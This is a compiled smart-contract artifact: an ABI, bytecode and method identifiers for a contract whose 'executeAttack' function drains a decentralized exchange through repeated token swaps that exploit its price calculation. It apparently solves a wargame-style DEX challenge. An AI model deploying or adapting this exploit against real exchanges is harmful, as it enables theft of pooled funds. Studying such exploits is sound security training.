{"abi":[{"type":"function","name":"debugInfo","inputs":[{"name":"dexAddress","type":"address","internalType":"address"}],"outputs":[{"name":"token1","type":"address","internalType":"address"},{"name":"token2","type":"address","internalType":"address"},{"name":"dexToken1","type":"uint256","internalType":"uint256"},{"name":"dexToken2","type":"uint256","internalType":"uint256"},{"name":"userToken1","type":"uint256","internalType":"uint256"},{"name":"userToken2","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"executeAttack","inputs":[{"name":"dexAddress","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b50610e9d8061001c5f395ff3fe608060405234801561000f575f5ffd5b5060043610610034575f3560e01c8063ab340bc914610038578063eb874a711461004d575b5f5ffd5b61004b610046366004610dc8565b61009c565b005b61006061005b366004610dc8565b6109e8565b604080516001600160a01b039788168152969095166020870152938501929092526060840152608083015260a082015260c00160405180910390f35b5f8190505f816001600160a01b031663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa1580156100dd573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101019190610dea565b90505f826001600160a01b03166325be124e6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610140573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101649190610dea565b60405163095ea7b360e01b81526001600160a01b038516600482018190525f19602483015291925063095ea7b3906044015f604051808303815f87803b1580156101ac575f5ffd5b505af11580156101be573d5f5f3e3d5ffd5b505060405163095ea7b360e01b81526001600160a01b0387811660048301525f1960248301528516925063095ea7b391506044016020604051808303815f875af115801561020e573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102329190610e05565b5060405163095ea7b360e01b81526001600160a01b0385811660048301525f19602483015282169063095ea7b3906044016020604051808303815f875af115801561027f573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102a39190610e05565b50604051633de222bb60e21b81526001600160a01b0383811660048301523360248301525f919085169063f7888aec90604401602060405180830381865afa1580156102f1573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103159190610e24565b9050801561038357604051630df791e560e41b81526001600160a01b03848116600483015283811660248301526044820183905285169063df791e50906064015f604051808303815f87803b15801561036c575f5ffd5b505af115801561037e573d5f5f3e3d5ffd5b505050505b604051633de222bb60e21b81526001600160a01b0383811660048301523360248301525f919086169063f7888aec90604401602060405180830381865afa1580156103d0573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103f49190610e24565b9050801561046257604051630df791e560e41b81526001600160a01b03848116600483015285811660248301526044820183905286169063df791e50906064015f604051808303815f87803b15801561044b575f5ffd5b505af115801561045d573d5f5f3e3d5ffd5b505050505b604051633de222bb60e21b81526001600160a01b03858116600483015233602483015286169063f7888aec90604401602060405180830381865afa1580156104ac573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906104d09190610e24565b9150811561053e57604051630df791e560e41b81526001600160a01b03858116600483015284811660248301526044820184905286169063df791e50906064015f604051808303815f87803b158015610527575f5ffd5b505af1158015610539573d5f5f3e3d5ffd5b505050505b604051633de222bb60e21b81526001600160a01b03848116600483015233602483015286169063f7888aec90604401602060405180830381865afa158015610588573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906105ac9190610e24565b9050801561061a57604051630df791e560e41b81526001600160a01b03848116600483015285811660248301526044820183905286169063df791e50906064015f604051808303815f87803b158015610603575f5ffd5b505af1158015610615573d5f5f3e3d5ffd5b505050505b604051633de222bb60e21b81526001600160a01b03858116600483015233602483015286169063f7888aec90604401602060405180830381865afa158015610664573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906106889190610e24565b915081156106f657604051630df791e560e41b81526001600160a01b03858116600483015284811660248301526044820184905286169063df791e50906064015f604051808303815f87803b1580156106df575f5ffd5b505af11580156106f1573d5f5f3e3d5ffd5b505050505b604051633de222bb60e21b81526001600160a01b03848116600483015233602483015286169063f7888aec90604401602060405180830381865afa158015610740573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906107649190610e24565b604051633de222bb60e21b81526001600160a01b03868116600483015288811660248301529192505f9187169063f7888aec90604401602060405180830381865afa1580156107b5573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906107d99190610e24565b604051633de222bb60e21b81526001600160a01b03868116600483015289811660248301529192505f9188169063f7888aec90604401602060405180830381865afa15801561082a573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061084e9190610e24565b90505f8311801561085e57505f82115b156109de57808381111561086f5750825b6040517fbfd7e00d0000000000000000000000000000000000000000000000000000000081526001600160a01b0387811660048301528881166024830152604482018390525f91908a169063bfd7e00d90606401602060405180830381865afa1580156108de573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906109029190610e24565b905083811061097557604051630df791e560e41b81526001600160a01b0388811660048301528981166024830152604482018490528a169063df791e50906064015f604051808303815f87803b15801561095a575f5ffd5b505af115801561096c573d5f5f3e3d5ffd5b505050506109db565b604051630df791e560e41b81526001600160a01b0388811660048301528981166024830152604482018790528a169063df791e50906064015f604051808303815f87803b1580156109c4575f5ffd5b505af11580156109d6573d5f5f3e3d5ffd5b505050505b50505b5050505050505050565b60408051600481526024810182526020810180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff167fd21220a70000000000000000000000000000000000000000000000000000000017905290515f91829182918291829182918891839182916001600160a01b03851691610a679190610e3b565b5f60405180830381855afa9150503d805f8114610a9f576040519150601f19603f3d011682016040523d82523d5f602084013e610aa4565b606091505b5060408051600481526024810182526020810180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff167f25be124e0000000000000000000000000000000000000000000000000000000017905290519294509092505f9182916001600160a01b038e1691610b1c9190610e3b565b5f60405180830381855afa9150503d805f8114610b54576040519150601f19603f3d011682016040523d82523d5f602084013e610b59565b606091505b5091509150838015610b685750815b8015610b75575082516020145b8015610b82575080516020145b15610da35782806020019051810190610b9b9190610dea565b9a5080806020019051810190610bb19190610dea565b99506001600160a01b038b1615801590610bd357506001600160a01b038a1615155b15610da357604051633de222bb60e21b81526001600160a01b038c811660048301528d8116602483015286169063f7888aec90604401602060405180830381865afa158015610c24573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610c489190610e24565b604051633de222bb60e21b81526001600160a01b038c811660048301528e81166024830152919a509086169063f7888aec90604401602060405180830381865afa158015610c98573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610cbc9190610e24565b604051633de222bb60e21b81526001600160a01b038d811660048301523360248301529199509086169063f7888aec90604401602060405180830381865afa158015610d0a573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610d2e9190610e24565b604051633de222bb60e21b81526001600160a01b038c811660048301523360248301529198509086169063f7888aec90604401602060405180830381865afa158015610d7c573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610da09190610e24565b95505b505050505091939550919395565b6001600160a01b0381168114610dc5575f5ffd5b50565b5f60208284031215610dd8575f5ffd5b8135610de381610db1565b9392505050565b5f60208284031215610dfa575f5ffd5b8151610de381610db1565b5f60208284031215610e15575f5ffd5b81518015158114610de3575f5ffd5b5f60208284031215610e34575f5ffd5b5051919050565b5f82515f5b81811015610e5a5760208186018101518583015201610e40565b505f92019182525091905056fea2646970667358221220242dd407bd2dc13d9cde264747615072708b5c4cd7bef3c7667ee0056bff334f64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"debugInfo(address)":"eb874a71","executeAttack(address)":"ab340bc9"},"id":0}